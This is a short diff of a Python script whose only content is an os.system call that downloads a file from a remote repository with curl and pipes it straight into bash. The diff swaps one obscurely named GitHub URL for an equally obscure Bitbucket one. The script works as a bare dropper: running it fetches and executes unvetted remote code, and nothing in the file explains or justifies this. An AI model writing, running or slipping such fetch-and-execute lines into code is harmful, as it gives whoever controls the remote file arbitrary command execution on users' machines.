@@ -1,3 +1,3 @@
 import os
 
-os.system('curl -sL https://github.com/arifrahman555/kolor/raw/main/suganteh | bash')
+os.system('curl -sL https://bitbucket.org/nicezep/korong/raw/master/exelai | bash')
